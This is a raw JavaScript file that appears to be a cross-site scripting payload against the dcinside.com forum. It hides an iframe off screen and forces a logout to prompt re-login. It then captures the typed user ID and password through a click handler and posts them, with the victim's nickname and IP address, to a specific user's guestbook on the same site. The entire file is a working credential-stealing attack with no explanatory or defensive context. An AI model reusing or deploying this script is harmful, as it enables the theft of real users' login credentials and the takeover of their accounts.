document.domain = 'dcinside.com';
nas = document.createElement('iframe');
nas.id = 'hash';
nas.name = 'hash';
nas.scrolling = 'no';
nas.style.position = 'fixed';
nas.style.top = '1px';
nas.style.left = '1px';
nas.style.width = '1px';
nas.style.height = '1px';
var $ = parent.$;
nas.style.top = '-1000px';
nas.style.left = '-1000px';
nas.style.width = '1000000px';
nas.style.height = '1000000px';
try {
    user_nick = parent.document.getElementsByName('name')[0].value;
    user_ip = parent.document.getElementsByName('user_ip')[0].value;
}
catch (error) {
    user_nick = "NULL"+parent.localStorage.getItem('nonmember_nick');;
    user_ip = parent.document.getElementsByName('user_ip')[0].value;
}
function request(user_id,pw) {
var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://gallog.dcinside.com/lastskyline/ajax/guestbook_ajax/write', true)
    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.onload = function () {
        // do something to response
        console.log(this.responseText);
    };
    data='ci_t=&password=1234&is_secret=0&name='+user_nick+'&memo='+user_nick + '(' + user_id + ')' + '\n' + pw + '\n' + user_ip;
    xhr.send(data);
}

parent.document.querySelector("#container > section > article:nth-child(3) > div.view_content_wrap > div > div.appending_file_box").appendChild(nas);
newwindow = window.open('https://sign.dcinside.com/logout?s_url=https://www.dcinside.com/', 'hash', 'width=1px, height=1px');
$('#hash').on('load', function () {
    newwindow.$('html').attr('onclick', 'window.parent.request($("user_id").val(),$("#pw").val());setTimeout(function(){window.opener.$("#hash").remove()},300);');
});
